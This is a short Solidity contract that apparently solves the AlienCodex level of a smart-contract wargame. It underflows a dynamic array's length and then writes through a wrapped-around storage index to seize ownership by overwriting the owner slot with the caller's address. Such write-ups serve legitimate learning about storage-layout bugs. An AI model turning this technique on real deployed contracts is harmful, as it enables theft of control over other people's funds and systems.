pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract Attack {
    function attack(address targetAddr) public {
        AlienCodex target = AlienCodex(targetAddr);

        target.makeContact();
        target.retract();

        uint256 index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
        target.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
